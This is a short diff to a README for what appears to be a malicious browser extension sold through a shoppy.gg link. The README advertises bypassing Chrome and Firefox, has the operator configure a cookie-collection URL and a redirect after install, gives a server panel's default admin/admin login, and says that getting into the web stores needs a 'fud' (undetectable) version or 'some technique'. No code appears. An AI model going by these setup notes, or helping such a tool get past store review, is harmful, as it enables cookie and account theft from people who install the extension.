@@ -36,7 +36,7 @@ open log without redirect , remove log very simple
 | Version      |    Pro                 |
 | Baypass      |  Chrome and Firefox    |
                                      
-|  https://shoppy.gg/product/5d9ifM3    |
+  https://shoppy.gg/product/5d9ifM3    
 
 
 
@@ -49,8 +49,6 @@ Start your wampserver,xamp ....etc and send the "server" folder to your server
 usernam  = admin
 
 password = admin
-
-2. `log1.php` 
 
 
 # Configuration : extension
@@ -79,13 +77,13 @@ change "url" redirect after install extension and "url" of cookies
  to upload extension in mozilla firefox or chrome web store you need a new version fud  or some technique .
 
 
-Demo video  Facebook : Chrome 
+# Demo video  Facebook : 
 
-+  https://web.facebook.com/102313318301415/videos/651706715777891/
+  Chrome  +  https://web.facebook.com/102313318301415/videos/651706715777891/
 
-Demo Video : Firefox
 
-+  https://web.facebook.com/102313318301415/videos/348004879720079/
+
+Firefox  +  https://web.facebook.com/102313318301415/videos/348004879720079/
 
 
 ## Contact 
